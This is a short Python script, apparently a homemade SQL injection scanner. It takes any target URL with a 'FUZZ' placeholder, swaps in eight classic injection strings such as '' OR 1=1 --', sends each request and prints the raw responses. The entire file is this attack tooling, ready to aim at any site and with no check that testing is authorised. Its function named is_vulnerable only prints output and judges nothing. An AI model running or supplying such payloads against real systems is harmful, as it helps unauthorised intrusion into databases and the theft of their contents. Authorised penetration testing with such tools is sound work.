import requests
import pyfiglet

ascii_banner = pyfiglet.figlet_format("AKINLAWON B. FAYOKUN SQLi-INJECTION SCANNER") 
print(ascii_banner) 

def test_payload(url, payload):
    # Prepare the URL with the payload
    test_url = url.replace("FUZZ", payload)

    # Send the request to the server
    response = requests.get(test_url)

    # Display the payload and the response
    print(f"Payload: {payload}")
    print(f"URL: {test_url}")
    print(f"Response Code: {response.status_code}")
    print("Response Content:")
    print(response.text)
    print("-" * 50)

def is_vulnerable(url):
    # Test payloads for SQL injection
    payloads = [
        "' OR 1=1 --",
        "' OR '1'='1",
        "\" OR 1=1 --",
        "\" OR \"1\"=\"1",
        "') OR 1=1 --",
        "') OR ('1'='1",
        "\") OR 1=1 --",
        "\") OR (\"1\"=\"1",
    ]

    for payload in payloads:
        test_payload(url, payload)

if __name__ == "__main__":
    target_url = input("Enter the target URL with 'FUZZ' as the injection point: ")

    # Perform SQL injection testing and display results
    is_vulnerable(target_url)
